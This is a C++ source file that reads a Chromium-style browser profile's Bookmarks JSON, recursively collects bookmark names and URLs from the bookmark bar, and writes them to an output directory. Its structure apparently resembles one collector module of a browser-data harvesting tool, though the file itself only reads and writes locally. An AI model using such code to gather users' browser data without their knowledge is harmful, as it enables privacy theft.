//
// Created by .1qxz on 08.06.2024.
//

#include "CBookmarks.h"

void CBookmarks::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    std::string data = Utils::readFile(this->getProfileDir(browser_root) / "Bookmarks");

    if(data.empty())
        return;

    json j = json::parse(data);
    std::list<std::unique_ptr<Entity>> bookmarks;

    if(j.contains("roots") && j["roots"].contains("bookmark_bar")) {
        try {
            CBookmarks::getBookmark(j["roots"]["bookmark_bar"], bookmarks);
        }
        catch (...) {}
    }

    Entity::writeSelf(root, bookmarks);
}

void CBookmarks::getBookmark(const json &j, std::list<std::unique_ptr<Entity>> &data) {
    if(j.contains("url")) {
        auto bookmark = std::make_unique<Bookmark>();
        bookmark->name = j["name"];
        bookmark->url = j["url"];

        data.push_back(std::move(bookmark));
    } else if(j.contains("children")) {
        for (const auto& child : j["children"]) {
            CBookmarks::getBookmark(child, data);
        }
    }
}
